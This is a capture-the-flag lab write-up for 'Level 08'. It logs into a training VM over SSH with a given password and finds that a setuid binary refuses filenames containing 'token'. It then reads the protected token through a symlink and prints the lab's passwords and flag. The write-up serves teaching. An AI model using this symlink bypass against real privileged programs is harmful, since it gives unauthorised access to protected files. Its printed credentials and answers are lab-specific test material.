# Level 08

## Requirements

- None

## Walkthrough

1. Login from the __attacker__'s machine.

	```
	ssh -p 4242 level08@192.168.1.32
	Password: fiumuikeil55xe9cu4dood66h
	```

1. Check files.

	```sh
	> ls -l
	total 16
	-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
	-rw-------  1 flag08 flag08    26 Mar  5  2016 token
	```

1. Let's run it.

	```sh
	> ./level08
	./level08 [file to read]
	```

1. Stupid enough, just give it the only other file we were provided.

	```sh
	> ./level08 token
	You may not access 'token'

	> cat token
	cat: token: Permission denied
	```

1. Fine, challenge accepted! Try anything else.

	```sh
	> FILE=/tmp/exploit08 && echo "exploitme" > $FILE && ./level08 $FILE
	exploitme
	```

1. Ok, so looks like if the file can be accessed, it just `print` it's content. Let's do a quick `strings` check.

	```sh
	> strings level08
	...
	printf
	strstr
	read
	open
	...
	write
	...
	token
	You may not access '%s'
	Unable to open %s
	Unable to read fd %d
	...
	```

1. Like on previous level, we notice few well known C functions.

	```
	- `printf` is used to print a formatted text into standard output
	- `strstr` is used to locate a substring
	- `read` is used to read content from a file descriptor
	- `write` is used to write content to a file descriptor
	- `open` is used to open a file
	```

1. Wait a minute... We have `token` in our list, which is the name of our target file, and `strstr` which is used to locate a substring... Let's try our previous test, but using `token` in the name.

	```sh
	> FILE=/tmp/exploit08_token && echo "exploitme" > $FILE && ./level08 $FILE
	You may not access '/tmp/exploit08_token'
	```

1. Ok, something ain't right here. Adding `token` to our file name revoked our access to it ? Are they seriously doing a simple check on file's name ?

	```sh
	# Notice the removed "n" at the end of FILE
	> FILE=/tmp/exploit08_toke && echo "exploitme" > $FILE && ./level08 $FILE
	exploitme
	```

1. Guess it's that simple... Now, since we want to access `token`, and we don't have any rights on it, maybe a simple symlink will do the trick.

	```sh
	> LINK=/tmp/exploit08 && ln -sf ./token $LINK && ./level08 $LINK
	level08: Unable to open /tmp/exploit08: No such file or directory

	> ls -l /tmp/exploit08
	lrwxrwxrwx 1 level08 level08 5 Aug 27 23:24 /tmp/exploit08 -> token
	```

1. Fail. Forgot to pass an absolute path for `token`.

	```sh
	> LINK=/tmp/exploit08 && ln -sf $PWD/token $LINK && ./level08 $LINK
	quif5eloekouj29ke0vouxean
	```

1. Insane, we did it. Get the flag.

	```sh
	> su flag08
	Password: quif5eloekouj29ke0vouxean
	Don't forget to launch getflag !

	> getflag
	Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
	```

## Documentation

- Function: [printf](https://man7.org/linux/man-pages/man3/printf.3.html)
- Function: [strstr](https://man7.org/linux/man-pages/man3/strstr.3.html)
- Function: [read](https://man7.org/linux/man-pages/man2/read.2.html)
- Function: [write](https://man7.org/linux/man-pages/man2/write.2.html)
- Function: [open](https://man7.org/linux/man-pages/man2/open.2.html)
